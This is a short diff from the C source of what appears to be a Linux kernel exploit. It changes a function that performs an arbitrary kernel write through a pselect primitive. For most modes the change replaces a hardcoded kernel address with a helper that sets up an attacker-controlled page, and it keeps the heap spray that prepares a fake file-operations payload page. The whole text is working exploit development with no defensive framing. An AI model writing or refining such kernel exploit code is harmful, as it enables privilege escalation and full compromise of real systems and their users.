@@ -253,12 +253,19 @@ static int do_one_write(uintptr_t target, const char *desc, int mode) {
   pselect_child_node = 1;
   set_pselect_write_mode(target, 0, mode);
   TIMER("  heap spray start");
-  if (mode != 4) {
-    pr_info("  [SKIP] KernelSnitch bypassed for mode=%d\n", mode);
-    page_base = 0xffffffc000000000ULL;
-  } else {
+  pid_t fp_pid = 0;
+  if (mode == 4) {
     page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
     if (!page_base) { pr_error("  heap spray failed\n"); clear_pselect_write(); return 0; }
+  } else {
+    pr_info("  [FPU] Using fp_helper_setup for mode=%d\n", mode);
+    page_base = fp_helper_setup(0, target, &fp_pid);
+    if (!page_base) {
+      pr_error("  fp_helper_setup failed\n");
+      clear_pselect_write();
+      return 0;
+    }
+    pr_info("  [FPU] fp_helper_setup ok page_base=0x%zx pid=%d\n", page_base, fp_pid);
   }
   TIMER("  heap spray done");
   run_main_route_threads();
